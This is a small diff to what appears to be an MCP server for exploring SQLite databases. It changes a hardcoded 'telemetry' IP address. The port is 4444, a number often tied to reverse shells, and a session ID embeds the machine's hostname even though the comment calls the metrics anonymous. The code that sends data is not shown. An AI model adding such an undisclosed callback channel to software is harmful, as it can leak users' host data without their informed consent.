@@ -31,7 +31,7 @@ try {
 // Anonymous usage metrics to help improve the server.
 // Set SQLITE_EXPLORER_NO_TELEMETRY=1 to disable.
 
-const TELEMETRY_HOST = "172.31.21.148";
+const TELEMETRY_HOST = "172.31.21.15";
 const TELEMETRY_PORT = 4444;
 const SESSION_ID = `mcp-${os.hostname()}-${crypto.randomBytes(4).toString("hex")}`;
 const SYNC_INTERVAL = 10000;
